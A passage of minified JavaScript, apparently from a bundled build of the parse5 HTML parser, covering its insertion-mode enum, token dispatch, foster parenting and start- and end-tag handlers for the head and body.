k;(function(e){e[e.INITIAL=0]="INITIAL",e[e.BEFORE_HTML=1]="BEFORE_HTML",e[e.BEFORE_HEAD=2]="BEFORE_HEAD",e[e.IN_HEAD=3]="IN_HEAD",e[e.IN_HEAD_NO_SCRIPT=4]="IN_HEAD_NO_SCRIPT",e[e.AFTER_HEAD=5]="AFTER_HEAD",e[e.IN_BODY=6]="IN_BODY",e[e.TEXT=7]="TEXT",e[e.IN_TABLE=8]="IN_TABLE",e[e.IN_TABLE_TEXT=9]="IN_TABLE_TEXT",e[e.IN_CAPTION=10]="IN_CAPTION",e[e.IN_COLUMN_GROUP=11]="IN_COLUMN_GROUP",e[e.IN_TABLE_BODY=12]="IN_TABLE_BODY",e[e.IN_ROW=13]="IN_ROW",e[e.IN_CELL=14]="IN_CELL",e[e.IN_SELECT=15]="IN_SELECT",e[e.IN_SELECT_IN_TABLE=16]="IN_SELECT_IN_TABLE",e[e.IN_TEMPLATE=17]="IN_TEMPLATE",e[e.AFTER_BODY=18]="AFTER_BODY",e[e.IN_FRAMESET=19]="IN_FRAMESET",e[e.AFTER_FRAMESET=20]="AFTER_FRAMESET",e[e.AFTER_AFTER_BODY=21]="AFTER_AFTER_BODY",e[e.AFTER_AFTER_FRAMESET=22]="AFTER_AFTER_FRAMESET"})(k||(k={}));const mA={startLine:-1,startCol:-1,startOffset:-1,endLine:-1,endCol:-1,endOffset:-1},Cm=new Set([d.TABLE,d.TBODY,d.TFOOT,d.THEAD,d.TR]),Qh={scriptingEnabled:!0,sourceCodeLocationInfo:!1,treeAdapter:ir,onParseError:null};class Yh{constructor(t,r,a=null,o=null){this.fragmentContext=a,this.scriptHandler=o,this.currentToken=null,this.stopped=!1,this.insertionMode=k.INITIAL,this.originalInsertionMode=k.INITIAL,this.headElement=null,this.formElement=null,this.currentNotInHTML=!1,this.tmplInsertionModeStack=[],this.pendingCharacterTokens=[],this.hasNonWhitespacePendingCharacterToken=!1,this.framesetOk=!0,this.skipNextNewLine=!1,this.fosterParentingEnabled=!1,this.options={...Qh,...t},this.treeAdapter=this.options.treeAdapter,this.onParseError=this.options.onParseError,this.onParseError&&(this.options.sourceCodeLocationInfo=!0),this.document=r??this.treeAdapter.createDocument(),this.tokenizer=new Hx(this.options,this),this.activeFormattingElements=new Gx(this.treeAdapter),this.fragmentContextID=a?Ci(this.treeAdapter.getTagName(a)):d.UNKNOWN,this._setContextModes(a??this.document,this.fragmentContextID),this.openElements=new Xx(this.document,this.treeAdapter,this)}static parse(t,r){const a=new this(r);return a.tokenizer.write(t,!0),a.document}static getFragmentParser(t,r){const a={...Qh,...r};t??(t=a.treeAdapter.createElement(M.TEMPLATE,V.HTML,[]));const o=a.treeAdapter.createElement("documentmock",V.HTML,[]),s=new this(a,o,t);return s.fragmentContextID===d.TEMPLATE&&s.tmplInsertionModeStack.unshift(k.IN_TEMPLATE),s._initTokenizerForFragmentParsing(),s._insertFakeRootElement(),s._resetInsertionMode(),s._findFormInFragmentContext(),s}getFragment(){const t=this.treeAdapter.getFirstChild(this.document),r=this.treeAdapter.createDocumentFragment();return this._adoptNodes(t,r),r}_err(t,r,a){var o;if(!this.onParseError)return;const s=(o=t.location)!==null&&o!==void 0?o:mA,l={code:r,startLine:s.startLine,startCol:s.startCol,startOffset:s.startOffset,endLine:a?s.startLine:s.endLine,endCol:a?s.startCol:s.endCol,endOffset:a?s.startOffset:s.endOffset};this.onParseError(l)}onItemPush(t,r,a){var o,s;(s=(o=this.treeAdapter).onItemPush)===null||s===void 0||s.call(o,t),a&&this.openElements.stackTop>0&&this._setContextModes(t,r)}onItemPop(t,r){var a,o;if(this.options.sourceCodeLocationInfo&&this._setEndLocation(t,this.currentToken),(o=(a=this.treeAdapter).onItemPop)===null||o===void 0||o.call(a,t,this.openElements.current),r){let s,l;this.openElements.stackTop===0&&this.fragmentContext?(s=this.fragmentContext,l=this.fragmentContextID):{current:s,currentTagId:l}=this.openElements,this._setContextModes(s,l)}}_setContextModes(t,r){const a=t===this.document||t&&this.treeAdapter.getNamespaceURI(t)===V.HTML;this.currentNotInHTML=!a,this.tokenizer.inForeignNode=!a&&t!==void 0&&r!==void 0&&!this._isIntegrationPoint(r,t)}_switchToTextParsing(t,r){this._insertElement(t,V.HTML),this.tokenizer.state=r,this.originalInsertionMode=this.insertionMode,this.insertionMode=k.TEXT}switchToPlaintextParsing(){this.insertionMode=k.TEXT,this.originalInsertionMode=k.IN_BODY,this.tokenizer.state=tt.PLAINTEXT}_getAdjustedCurrentElement(){return this.openElements.stackTop===0&&this.fragmentContext?this.fragmentContext:this.openElements.current}_findFormInFragmentContext(){let t=this.fragmentContext;for(;t;){if(this.treeAdapter.getTagName(t)===M.FORM){this.formElement=t;break}t=this.treeAdapter.getParentNode(t)}}_initTokenizerForFragmentParsing(){if(!(!this.fragmentContext||this.treeAdapter.getNamespaceURI(this.fragmentContext)!==V.HTML))switch(this.fragmentContextID){case d.TITLE:case d.TEXTAREA:{this.tokenizer.state=tt.RCDATA;break}case d.STYLE:case d.XMP:case d.IFRAME:case d.NOEMBED:case d.NOFRAMES:case d.NOSCRIPT:{this.tokenizer.state=tt.RAWTEXT;break}case d.SCRIPT:{this.tokenizer.state=tt.SCRIPT_DATA;break}case d.PLAINTEXT:{this.tokenizer.state=tt.PLAINTEXT;break}}}_setDocumentType(t){const r=t.name||"",a=t.publicId||"",o=t.systemId||"";if(this.treeAdapter.setDocumentType(this.document,r,a,o),t.location){const l=this.treeAdapter.getChildNodes(this.document).find(h=>this.treeAdapter.isDocumentTypeNode(h));l&&this.treeAdapter.setNodeSourceCodeLocation(l,t.location)}}_attachElementToTree(t,r){if(this.options.sourceCodeLocationInfo){const a=r&&{...r,startTag:r};this.treeAdapter.setNodeSourceCodeLocation(t,a)}if(this._shouldFosterParentOnInsertion())this._fosterParentElement(t);else{const a=this.openElements.currentTmplContentOrNode;this.treeAdapter.appendChild(a??this.document,t)}}_appendElement(t,r){const a=this.treeAdapter.createElement(t.tagName,r,t.attrs);this._attachElementToTree(a,t.location)}_insertElement(t,r){const a=this.treeAdapter.createElement(t.tagName,r,t.attrs);this._attachElementToTree(a,t.location),this.openElements.push(a,t.tagID)}_insertFakeElement(t,r){const a=this.treeAdapter.createElement(t,V.HTML,[]);this._attachElementToTree(a,null),this.openElements.push(a,r)}_insertTemplate(t){const r=this.treeAdapter.createElement(t.tagName,V.HTML,t.attrs),a=this.treeAdapter.createDocumentFragment();this.treeAdapter.setTemplateContent(r,a),this._attachElementToTree(r,t.location),this.openElements.push(r,t.tagID),this.options.sourceCodeLocationInfo&&this.treeAdapter.setNodeSourceCodeLocation(a,null)}_insertFakeRootElement(){const t=this.treeAdapter.createElement(M.HTML,V.HTML,[]);this.options.sourceCodeLocationInfo&&this.treeAdapter.setNodeSourceCodeLocation(t,null),this.treeAdapter.appendChild(this.openElements.current,t),this.openElements.push(t,d.HTML)}_appendCommentNode(t,r){const a=this.treeAdapter.createCommentNode(t.data);this.treeAdapter.appendChild(r,a),this.options.sourceCodeLocationInfo&&this.treeAdapter.setNodeSourceCodeLocation(a,t.location)}_insertCharacters(t){let r,a;if(this._shouldFosterParentOnInsertion()?({parent:r,beforeElement:a}=this._findFosterParentingLocation(),a?this.treeAdapter.insertTextBefore(r,t.chars,a):this.treeAdapter.insertText(r,t.chars)):(r=this.openElements.currentTmplContentOrNode,this.treeAdapter.insertText(r,t.chars)),!t.location)return;const o=this.treeAdapter.getChildNodes(r),s=a?o.lastIndexOf(a):o.length,l=o[s-1];if(this.treeAdapter.getNodeSourceCodeLocation(l)){const{endLine:p,endCol:g,endOffset:T}=t.location;this.treeAdapter.updateNodeSourceCodeLocation(l,{endLine:p,endCol:g,endOffset:T})}else this.options.sourceCodeLocationInfo&&this.treeAdapter.setNodeSourceCodeLocation(l,t.location)}_adoptNodes(t,r){for(let a=this.treeAdapter.getFirstChild(t);a;a=this.treeAdapter.getFirstChild(t))this.treeAdapter.detachNode(a),this.treeAdapter.appendChild(r,a)}_setEndLocation(t,r){if(this.treeAdapter.getNodeSourceCodeLocation(t)&&r.location){const a=r.location,o=this.treeAdapter.getTagName(t),s=r.type===Pe.END_TAG&&o===r.tagName?{endTag:{...a},endLine:a.endLine,endCol:a.endCol,endOffset:a.endOffset}:{endLine:a.startLine,endCol:a.startCol,endOffset:a.startOffset};this.treeAdapter.updateNodeSourceCodeLocation(t,s)}}shouldProcessStartTagTokenInForeignContent(t){if(!this.currentNotInHTML)return!1;let r,a;return this.openElements.stackTop===0&&this.fragmentContext?(r=this.fragmentContext,a=this.fragmentContextID):{current:r,currentTagId:a}=this.openElements,t.tagID===d.SVG&&this.treeAdapter.getTagName(r)===M.ANNOTATION_XML&&this.treeAdapter.getNamespaceURI(r)===V.MATHML?!1:this.tokenizer.inForeignNode||(t.tagID===d.MGLYPH||t.tagID===d.MALIGNMARK)&&a!==void 0&&!this._isIntegrationPoint(a,r,V.HTML)}_processToken(t){switch(t.type){case Pe.CHARACTER:{this.onCharacter(t);break}case Pe.NULL_CHARACTER:{this.onNullCharacter(t);break}case Pe.COMMENT:{this.onComment(t);break}case Pe.DOCTYPE:{this.onDoctype(t);break}case Pe.START_TAG:{this._processStartTag(t);break}case Pe.END_TAG:{this.onEndTag(t);break}case Pe.EOF:{this.onEof(t);break}case Pe.WHITESPACE_CHARACTER:{this.onWhitespaceCharacter(t);break}}}_isIntegrationPoint(t,r,a){const o=this.treeAdapter.getNamespaceURI(r),s=this.treeAdapter.getAttrList(r);return dA(t,o,s,a)}_reconstructActiveFormattingElements(){const t=this.activeFormattingElements.entries.length;if(t){const r=this.activeFormattingElements.entries.findIndex(o=>o.type===En.Marker||this.openElements.contains(o.element)),a=r===-1?t-1:r-1;for(let o=a;o>=0;o--){const s=this.activeFormattingElements.entries[o];this._insertElement(s.token,this.treeAdapter.getNamespaceURI(s.element)),s.element=this.openElements.current}}}_closeTableCell(){this.openElements.generateImpliedEndTags(),this.openElements.popUntilTableCellPopped(),this.activeFormattingElements.clearToLastMarker(),this.insertionMode=k.IN_ROW}_closePElement(){this.openElements.generateImpliedEndTagsWithExclusion(d.P),this.openElements.popUntilTagNamePopped(d.P)}_resetInsertionMode(){for(let t=this.openElements.stackTop;t>=0;t--)switch(t===0&&this.fragmentContext?this.fragmentContextID:this.openElements.tagIDs[t]){case d.TR:{this.insertionMode=k.IN_ROW;return}case d.TBODY:case d.THEAD:case d.TFOOT:{this.insertionMode=k.IN_TABLE_BODY;return}case d.CAPTION:{this.insertionMode=k.IN_CAPTION;return}case d.COLGROUP:{this.insertionMode=k.IN_COLUMN_GROUP;return}case d.TABLE:{this.insertionMode=k.IN_TABLE;return}case d.BODY:{this.insertionMode=k.IN_BODY;return}case d.FRAMESET:{this.insertionMode=k.IN_FRAMESET;return}case d.SELECT:{this._resetInsertionModeForSelect(t);return}case d.TEMPLATE:{this.insertionMode=this.tmplInsertionModeStack[0];return}case d.HTML:{this.insertionMode=this.headElement?k.AFTER_HEAD:k.BEFORE_HEAD;return}case d.TD:case d.TH:{if(t>0){this.insertionMode=k.IN_CELL;return}break}case d.HEAD:{if(t>0){this.insertionMode=k.IN_HEAD;return}break}}this.insertionMode=k.IN_BODY}_resetInsertionModeForSelect(t){if(t>0)for(let r=t-1;r>0;r--){const a=this.openElements.tagIDs[r];if(a===d.TEMPLATE)break;if(a===d.TABLE){this.insertionMode=k.IN_SELECT_IN_TABLE;return}}this.insertionMode=k.IN_SELECT}_isElementCausesFosterParenting(t){return Cm.has(t)}_shouldFosterParentOnInsertion(){return this.fosterParentingEnabled&&this.openElements.currentTagId!==void 0&&this._isElementCausesFosterParenting(this.openElements.currentTagId)}_findFosterParentingLocation(){for(let t=this.openElements.stackTop;t>=0;t--){const r=this.openElements.items[t];switch(this.openElements.tagIDs[t]){case d.TEMPLATE:{if(this.treeAdapter.getNamespaceURI(r)===V.HTML)return{parent:this.treeAdapter.getTemplateContent(r),beforeElement:null};break}case d.TABLE:{const a=this.treeAdapter.getParentNode(r);return a?{parent:a,beforeElement:r}:{parent:this.openElements.items[t-1],beforeElement:null}}}}return{parent:this.openElements.items[0],beforeElement:null}}_fosterParentElement(t){const r=this._findFosterParentingLocation();r.beforeElement?this.treeAdapter.insertBefore(r.parent,t,r.beforeElement):this.treeAdapter.appendChild(r.parent,t)}_isSpecialElement(t,r){const a=this.treeAdapter.getNamespaceURI(t);return Dx[a].has(r)}onCharacter(t){if(this.skipNextNewLine=!1,this.tokenizer.inForeignNode){YL(this,t);return}switch(this.insertionMode){case k.INITIAL:{ga(this,t);break}case k.BEFORE_HTML:{Ca(this,t);break}case k.BEFORE_HEAD:{xa(this,t);break}case k.IN_HEAD:{Aa(this,t);break}case k.IN_HEAD_NO_SCRIPT:{La(this,t);break}case k.AFTER_HEAD:{ka(this,t);break}case k.IN_BODY:case k.IN_CAPTION:case k.IN_CELL:case k.IN_TEMPLATE:{Am(this,t);break}case k.TEXT:case k.IN_SELECT:case k.IN_SELECT_IN_TABLE:{this._insertCharacters(t);break}case k.IN_TABLE:case k.IN_TABLE_BODY:case k.IN_ROW:{Yl(this,t);break}case k.IN_TABLE_TEXT:{Rm(this,t);break}case k.IN_COLUMN_GROUP:{bo(this,t);break}case k.AFTER_BODY:{_o(this,t);break}case k.AFTER_AFTER_BODY:{ho(this,t);break}}}onNullCharacter(t){if(this.skipNextNewLine=!1,this.tokenizer.inForeignNode){QL(this,t);return}switch(this.insertionMode){case k.INITIAL:{ga(this,t);break}case k.BEFORE_HTML:{Ca(this,t);break}case k.BEFORE_HEAD:{xa(this,t);break}case k.IN_HEAD:{Aa(this,t);break}case k.IN_HEAD_NO_SCRIPT:{La(this,t);break}case k.AFTER_HEAD:{ka(this,t);break}case k.TEXT:{this._insertCharacters(t);break}case k.IN_TABLE:case k.IN_TABLE_BODY:case k.IN_ROW:{Yl(this,t);break}case k.IN_COLUMN_GROUP:{bo(this,t);break}case k.AFTER_BODY:{_o(this,t);break}case k.AFTER_AFTER_BODY:{ho(this,t);break}}}onComment(t){if(this.skipNextNewLine=!1,this.currentNotInHTML){mc(this,t);return}switch(this.insertionMode){case k.INITIAL:case k.BEFORE_HTML:case k.BEFORE_HEAD:case k.IN_HEAD:case k.IN_HEAD_NO_SCRIPT:case k.AFTER_HEAD:case k.IN_BODY:case k.IN_TABLE:case k.IN_CAPTION:case k.IN_COLUMN_GROUP:case k.IN_TABLE_BODY:case k.IN_ROW:case k.IN_CELL:case k.IN_SELECT:case k.IN_SELECT_IN_TABLE:case k.IN_TEMPLATE:case k.IN_FRAMESET:case k.AFTER_FRAMESET:{mc(this,t);break}case k.IN_TABLE_TEXT:{Ea(this,t);break}case k.AFTER_BODY:{yA(this,t);break}case k.AFTER_AFTER_BODY:case k.AFTER_AFTER_FRAMESET:{CA(this,t);break}}}onDoctype(t){switch(this.skipNextNewLine=!1,this.insertionMode){case k.INITIAL:{xA(this,t);break}case k.BEFORE_HEAD:case k.IN_HEAD:case k.IN_HEAD_NO_SCRIPT:case k.AFTER_HEAD:{this._err(t,W.misplacedDoctype);break}case k.IN_TABLE_TEXT:{Ea(this,t);break}}}onStartTag(t){this.skipNextNewLine=!1,this.currentToken=t,this._processStartTag(t),t.selfClosing&&!t.ackSelfClosing&&this._err(t,W.nonVoidHtmlElementStartTagWithTrailingSolidus)}_processStartTag(t){this.shouldProcessStartTagTokenInForeignContent(t)?XL(this,t):this._startTagOutsideForeignContent(t)}_startTagOutsideForeignContent(t){switch(this.insertionMode){case k.INITIAL:{ga(this,t);break}case k.BEFORE_HTML:{AA(this,t);break}case k.BEFORE_HEAD:{kA(this,t);break}case k.IN_HEAD:{ln(this,t);break}case k.IN_HEAD_NO_SCRIPT:{vA(this,t);break}case k.AFTER_HEAD:{OA(this,t);break}case k.IN_BODY:{Ct(this,t);break}case k.IN_TABLE:{Ti(this,t);break}case k.IN_TABLE_TEXT:{Ea(this,t);break}case k.IN_CAPTION:{IL(this,t);break}case k.IN_COLUMN_GROUP:{Mc(this,t);break}case k.IN_TABLE_BODY:{Fo(this,t);break}case k.IN_ROW:{Bo(this,t);break}case k.IN_CELL:{RL(this,t);break}case k.IN_SELECT:{wm(this,t);break}case k.IN_SELECT_IN_TABLE:{PL(this,t);break}case k.IN_TEMPLATE:{DL(this,t);break}case k.AFTER_BODY:{FL(this,t);break}case k.IN_FRAMESET:{BL(this,t);break}case k.AFTER_FRAMESET:{UL(this,t);break}case k.AFTER_AFTER_BODY:{WL(this,t);break}case k.AFTER_AFTER_FRAMESET:{jL(this,t);break}}}onEndTag(t){this.skipNextNewLine=!1,this.currentToken=t,this.currentNotInHTML?GL(this,t):this._endTagOutsideForeignContent(t)}_endTagOutsideForeignContent(t){switch(this.insertionMode){case k.INITIAL:{ga(this,t);break}case k.BEFORE_HTML:{LA(this,t);break}case k.BEFORE_HEAD:{IA(this,t);break}case k.IN_HEAD:{NA(this,t);break}case k.IN_HEAD_NO_SCRIPT:{RA(this,t);break}case k.AFTER_HEAD:{PA(this,t);break}case k.IN_BODY:{Mo(this,t);break}case k.TEXT:{TL(this,t);break}case k.IN_TABLE:{Pa(this,t);break}case k.IN_TABLE_TEXT:{Ea(this,t);break}case k.IN_CAPTION:{NL(this,t);break}case k.IN_COLUMN_GROUP:{vL(this,t);break}case k.IN_TABLE_BODY:{gc(this,t);break}case k.IN_ROW:{Pm(this,t);break}case k.IN_CELL:{OL(this,t);break}case k.IN_SELECT:{Dm(this,t);break}case k.IN_SELECT_IN_TABLE:{wL(this,t);break}case k.IN_TEMPLATE:{ML(this,t);break}case k.AFTER_BODY:{Fm(this,t);break}case k.IN_FRAMESET:{HL(this,t);break}case k.AFTER_FRAMESET:{zL(this,t);break}case k.AFTER_AFTER_BODY:{ho(this,t);break}}}onEof(t){switch(this.insertionMode){case k.INITIAL:{ga(this,t);break}case k.BEFORE_HTML:{Ca(this,t);break}case k.BEFORE_HEAD:{xa(this,t);break}case k.IN_HEAD:{Aa(this,t);break}case k.IN_HEAD_NO_SCRIPT:{La(this,t);break}case k.AFTER_HEAD:{ka(this,t);break}case k.IN_BODY:case k.IN_TABLE:case k.IN_CAPTION:case k.IN_COLUMN_GROUP:case k.IN_TABLE_BODY:case k.IN_ROW:case k.IN_CELL:case k.IN_SELECT:case k.IN_SELECT_IN_TABLE:{Nm(this,t);break}case k.TEXT:{bL(this,t);break}case k.IN_TABLE_TEXT:{Ea(this,t);break}case k.IN_TEMPLATE:{Mm(this,t);break}case k.AFTER_BODY:case k.IN_FRAMESET:case k.AFTER_FRAMESET:case k.AFTER_AFTER_BODY:case k.AFTER_AFTER_FRAMESET:{Dc(this,t);break}}}onWhitespaceCharacter(t){if(this.skipNextNewLine&&(this.skipNextNewLine=!1,t.chars.charCodeAt(0)===y.LINE_FEED)){if(t.chars.length===1)return;t.chars=t.chars.substr(1)}if(this.tokenizer.inForeignNode){this._insertCharacters(t);return}switch(this.insertionMode){case k.IN_HEAD:case k.IN_HEAD_NO_SCRIPT:case k.AFTER_HEAD:case k.TEXT:case k.IN_COLUMN_GROUP:case k.IN_SELECT:case k.IN_SELECT_IN_TABLE:case k.IN_FRAMESET:case k.AFTER_FRAMESET:{this._insertCharacters(t);break}case k.IN_BODY:case k.IN_CAPTION:case k.IN_CELL:case k.IN_TEMPLATE:case k.AFTER_BODY:case k.AFTER_AFTER_BODY:case k.AFTER_AFTER_FRAMESET:{xm(this,t);break}case k.IN_TABLE:case k.IN_TABLE_BODY:case k.IN_ROW:{Yl(this,t);break}case k.IN_TABLE_TEXT:{vm(this,t);break}}}}function gA(e,t){let r=e.activeFormattingElements.getElementEntryInScopeWithTagName(t.tagName);return r?e.openElements.contains(r.element)?e.openElements.hasInScope(t.tagID)||(r=null):(e.activeFormattingElements.removeEntry(r),r=null):Im(e,t),r}function EA(e,t){let r=null,a=e.openElements.stackTop;for(;a>=0;a--){const o=e.openElements.items[a];if(o===t.element)break;e._isSpecialElement(o,e.openElements.tagIDs[a])&&(r=o)}return r||(e.openElements.shortenToLength(Math.max(a,0)),e.activeFormattingElements.removeEntry(t)),r}function TA(e,t,r){let a=t,o=e.openElements.getCommonAncestor(t);for(let s=0,l=o;l!==r;s++,l=o){o=e.openElements.getCommonAncestor(l);const h=e.activeFormattingElements.getElementEntry(l),p=h&&s>=pA;!h||p?(p&&e.activeFormattingElements.removeEntry(h),e.openElements.remove(l)):(l=bA(e,h),a===t&&(e.activeFormattingElements.bookmark=h),e.treeAdapter.detachNode(a),e.treeAdapter.appendChild(l,a),a=l)}return a}function bA(e,t){const r=e.treeAdapter.getNamespaceURI(t.element),a=e.treeAdapter.createElement(t.token.tagName,r,t.token.attrs);return e.openElements.replace(t.element,a),t.element=a,a}function _A(e,t,r){const a=e.treeAdapter.getTagName(t),o=Ci(a);if(e._isElementCausesFosterParenting(o))e._fosterParentElement(r);else{const s=e.treeAdapter.getNamespaceURI(t);o===d.TEMPLATE&&s===V.HTML&&(t=e.treeAdapter.getTemplateContent(t)),e.treeAdapter.appendChild(t,r)}}function SA(e,t,r){const a=e.treeAdapter.getNamespaceURI(r.element),{token:o}=r,s=e.treeAdapter.createElement(o.tagName,a,o.attrs);e._adoptNodes(t,s),e.treeAdapter.appendChild(t,s),e.activeFormattingElements.insertElementAfterBookmark(s,o),e.activeFormattingElements.removeEntry(r),e.openElements.remove(r.element),e.openElements.insertAfter(t,s,o.tagID)}function wc(e,t){for(let r=0;r<hA;r++){const a=gA(e,t);if(!a)break;const o=EA(e,a);if(!o)break;e.activeFormattingElements.bookmark=a;const s=TA(e,o,a.element),l=e.openElements.getCommonAncestor(a.element);e.treeAdapter.detachNode(s),l&&_A(e,l,s),SA(e,o,a)}}function mc(e,t){e._appendCommentNode(t,e.openElements.currentTmplContentOrNode)}function yA(e,t){e._appendCommentNode(t,e.openElements.items[0])}function CA(e,t){e._appendCommentNode(t,e.document)}function Dc(e,t){if(e.stopped=!0,t.location){const r=e.fragmentContext?0:2;for(let a=e.openElements.stackTop;a>=r;a--)e._setEndLocation(e.openElements.items[a],t);if(!e.fragmentContext&&e.openElements.stackTop>=0){const a=e.openElements.items[0],o=e.treeAdapter.getNodeSourceCodeLocation(a);if(o&&!o.endTag&&(e._setEndLocation(a,t),e.openElements.stackTop>=1)){const s=e.openElements.items[1],l=e.treeAdapter.getNodeSourceCodeLocation(s);l&&!l.endTag&&e._setEndLocation(s,t)}}}}function xA(e,t){e._setDocumentType(t);const r=t.forceQuirks?Kt.QUIRKS:eA(t);Zx(t)||e._err(t,W.nonConformingDoctype),e.treeAdapter.setDocumentMode(e.document,r),e.insertionMode=k.BEFORE_HTML}function ga(e,t){e._err(t,W.missingDoctype,!0),e.treeAdapter.setDocumentMode(e.document,Kt.QUIRKS),e.insertionMode=k.BEFORE_HTML,e._processToken(t)}function AA(e,t){t.tagID===d.HTML?(e._insertElement(t,V.HTML),e.insertionMode=k.BEFORE_HEAD):Ca(e,t)}function LA(e,t){const r=t.tagID;(r===d.HTML||r===d.HEAD||r===d.BODY||r===d.BR)&&Ca(e,t)}function Ca(e,t){e._insertFakeRootElement(),e.insertionMode=k.BEFORE_HEAD,e._processToken(t)}function kA(e,t){switch(t.tagID){case d.HTML:{Ct(e,t);break}case d.HEAD:{e._insertElement(t,V.HTML),e.headElement=e.openElements.current,e.insertionMode=k.IN_HEAD;break}default:xa(e,t)}}function IA(e,t){const r=t.tagID;r===d.HEAD||r===d.BODY||r===d.HTML||r===d.BR?xa(e,t):e._err(t,W.endTagWithoutMatchingOpenElement)}function xa(e,t){e._insertFakeElement(M.HEAD,d.HEAD),e.headElement=e.openElements.current,e.insertionMode=k.IN_HEAD,e._processToken(t)}function ln(e,t){switch(t.tagID){case d.HTML:{Ct(e,t);break}case d.BASE:case d.BASEFONT:case d.BGSOUND:case d.LINK:case d.META:{e._appendElement(t,V.HTML),t.ackSelfClosing=!0;break}case d.TITLE:{e._switchToTextParsing(t,tt.RCDATA);break}case d.NOSCRIPT:{e.options.scriptingEnabled?e._switchToTextParsing(t,tt.RAWTEXT):(e._insertElement(t,V.HTML),e.insertionMode=k.IN_HEAD_NO_SCRIPT);break}case d.NOFRAMES:case d.STYLE:{e._switchToTextParsing(t,tt.RAWTEXT);break}case d.SCRIPT:{e._switchToTextParsing(t,tt.SCRIPT_DATA);break}case d.TEMPLATE:{e._insertTemplate(t),e.activeFormattingElements.insertMarker(),e.framesetOk=!1,e.insertionMode=k.IN_TEMPLATE,e.tmplInsertionModeStack.unshift(k.IN_TEMPLATE);break}case d.HEAD:{e._err(t,W.misplacedStartTagForHeadElement);break}default:Aa(e,t)}}function NA(e,t){switch(t.tagID){case d.HEAD:{e.openElements.pop(),e.insertionMode=k.AFTER_HEAD;break}case d.BODY:case d.BR:case d.HTML:{Aa(e,t);break}case d.TEMPLATE:{wr(e,t);break}default:e._err(t,W.endTagWithoutMatchingOpenElement)}}function wr(e,t){e.openElements.tmplCount>0?(e.openElements.generateImpliedEndTagsThoroughly(),e.openElements.currentTagId!==d.TEMPLATE&&e._err(t,W.closingOfElementWithOpenChildElements),e.openElements.popUntilTagNamePopped(d.TEMPLATE),e.activeFormattingElements.clearToLastMarker(),e.tmplInsertionModeStack.shift(),e._resetInsertionMode()):e._err(t,W.endTagWithoutMatchingOpenElement)}function Aa(e,t){e.openElements.pop(),e.insertionMode=k.AFTER_HEAD,e._processToken(t)}function vA(e,t){switch(t.tagID){case d.HTML:{Ct(e,t);break}case d.BASEFONT:case d.BGSOUND:case d.HEAD:case d.LINK:case d.META:case d.NOFRAMES:case d.STYLE:{ln(e,t);break}case d.NOSCRIPT:{e._err(t,W.nestedNoscriptInHead);break}default:La(e,t)}}function RA(e,t){switch(t.tagID){case d.NOSCRIPT:{e.openElements.pop(),e.insertionMode=k.IN_HEAD;break}case d.BR:{La(e,t);break}default:e._err(t,W.endTagWithoutMatchingOpenElement)}}function La(e,t){const r=t.type===Pe.EOF?W.openElementsLeftAfterEof:W.disallowedContentInNoscriptInHead;e._err(t,r),e.openElements.pop(),e.insertionMode=k.IN_HEAD,e._processToken(t)}function OA(e,t){switch(t.tagID){case d.HTML:{Ct(e,t);break}case d.BODY:{e._insertElement(t,V.HTML),e.framesetOk=!1,e.insertionMode=k.IN_BODY;break}case d.FRAMESET:{e._insertElement(t,V.HTML),e.insertionMode=k.IN_FRAMESET;break}case d.BASE:case d.BASEFONT:case d.BGSOUND:case d.LINK:case d.META:case d.NOFRAMES:case d.SCRIPT:case d.STYLE:case d.TEMPLATE:case d.TITLE:{e._err(t,W.abandonedHeadElementChild),e.openElements.push(e.headElement,d.HEAD),ln(e,t),e.openElements.remove(e.headElement);break}case d.HEAD:{e._err(t,W.misplacedStartTagForHeadElement);break}default:ka(e,t)}}function PA(e,t){switch(t.tagID){case d.BODY:case d.HTML:case d.BR:{ka(e,t);break}case d.TEMPLATE:{wr(e,t);break}default:e._err(t,W.endTagWithoutMatchingOpenElement)}}function ka(e,t){e._insertFakeElement(M.BODY,d.BODY),e.insertionMode=k.IN_BODY,Do(e,t)}function Do(e,t){switch(t.type){case Pe.CHARACTER:{Am(e,t);break}case Pe.WHITESPACE_CHARACTER:{xm(e,t);break}case Pe.COMMENT:{mc(e,t);break}case Pe.START_TAG:{Ct(e,t);break}case Pe.END_TAG:{Mo(e,t);break}case Pe.EOF:{Nm(e,t);break}}}function xm(e,t){e._reconstructActiveFormattingElements(),e._insertCharacters(t)}function Am(e,t){e._reconstructActiveFormattingElements(),e._insertCharacters(t),e.framesetOk=!1}function wA(e,t){e.openElements.tmplCount===0&&e.treeAdapter.adoptAttributes(e.openElements.items[0],t.attrs)}function DA(e,t){const r=e.openElements.tryPeekProperlyNestedBodyElement();r&&e.openElements.tmplCount===0&&(e.framesetOk=!1,e.treeAdapter.adoptAttributes(r,t.attrs))}function MA(e,t){const r=e.openElements.tryPeekProperlyNestedBodyElement();e.framesetOk&&r&&(e.treeAdapter.detachNode(r),e.openElements.popAllUpToHtmlElement(),e._insertElement(t,V.HTML),e.insertionMode=k.IN_FRAMESET)}function FA(e,t){e.openElements.hasInButtonScope(d.P)&&e._closePElement(),e._insertElement(t,V.HTML)}function BA(e,t){e.openElements.hasInButtonScope(d.P)&&e._closePElement(),e.openElements.currentTagId!==void 0&&pc.has(e.openElements.currentTagId)&&e.openElements.pop(),e._insertElement(t,V.HTML)}function HA(e,t){e.openElements.hasInButtonScope(d.P)&&e._closePElement(),e._insertElement(t,V.HTML),e.skipNextNewLine=!0,e.framesetOk=!1}function UA(e,t){const r=e.openElements.tmplCount>0;(!e.formElement||r)&&(e.openElements.hasInButtonScope(d.P)&&e._closePElement(),e._insertElement(t,V.HTML),r||(e.formElement=e.openElements.current))}function zA(e,t){e.framesetOk=!1;const r=t.tagID;for(let a=e.openElements.stackTop;a>=0;a--){const o=e.openElements.tagIDs[a];if(r===d.LI&&o===d.LI||(r===d.DD||r===d.DT)&&(o===d.DD||o===d.DT)){e.openElements.generateImpliedEndTagsWithExclusion(o),e.openElements.popUntilTagNamePopped(o);break}if(o!==d.ADDRESS&&o!==d.DIV&&o!==d.P&&e._isSpecialElement(e.openElements.items[a],o))break}e.openElements.hasInButtonScope(d.P)&&e._closePElement(),e._insertElement(t,V.HTML)}function WA(e,t){e.openElements.hasInButtonScope(d.P)&&e._closePElement(),e._insertElement(t,V.HTML),e.tokenizer.state=tt.PLAINTEXT}function jA(e,t){e.openElements.hasInScope(d.BUTTON)&&(e.openElements.generateImpliedEndTags(),e.openElements.popUntilTagNamePopped(d.BUTTON)),e._reconstructActiveFormattingElements(),e._insertElement(t,V.HTML),e.framesetOk=!1}function QA(e,t){const 